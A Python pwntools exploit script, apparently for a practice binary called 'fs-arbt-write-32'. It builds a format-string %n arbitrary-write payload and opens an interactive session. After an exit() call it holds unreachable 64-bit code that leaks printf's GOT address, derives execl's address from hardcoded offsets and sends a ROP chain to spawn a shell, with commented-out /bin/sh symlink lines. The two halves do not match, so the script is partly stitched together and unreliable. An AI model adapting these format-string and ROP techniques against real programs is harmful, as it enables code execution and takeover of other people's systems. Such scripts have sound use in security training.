#!/usr/bin/env python

from pwn import *
import os

p = process('./fs-arbt-write-32')

random_addr = 0x804a048
buf = p32(random_addr) + p32(random_addr + 2)

buf += "%" + "45060x" + "%7$n"
buf += "%" + "19138x" + "%8$n"

print (buf)
p.sendline(buf)

#p.sendline(hex(addr))

p.interactive()

exit()

printf_got = p.elf.got['printf']
print ("GOT: %s" % hex(printf_got))


print(p.recv())
p.sendline("32")

p.sendline(hex(printf_got))

data = p.recv()
print (len(data))
print (repr(data))


printf_addr = data[112:120]
print((printf_addr))
printf_addr = u64(printf_addr)
print(hex(printf_addr))


"""
pwndbg> print printf
$1 = {<text variable, no debug info>} 0x7f728e2f2800 <__printf>
pwndbg> print execl
$2 = {<text variable, no debug info>} 0x7f728e369a20 <__GI_execl>
"""

execl_temp = 0x7f728e369a20
printf_temp = 0x7f728e2f2800

execl = printf_addr - printf_temp + execl_temp


buf = "A" * 0x80 + "BBBBBBBB"


pop_rdi_ret = p64(0x400a33)
pop_rsi_pop_ret = p64(0x400a31)

string = p64(0x400c4c) #"d"

#if os.path.exists("$"):
#    os.unlink("$")

#os.symlink("/bin/sh", "$")

buf += pop_rdi_ret
buf += string
buf += pop_rsi_pop_ret
buf += p64(0) + p64(0)
buf += p64(execl)


with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
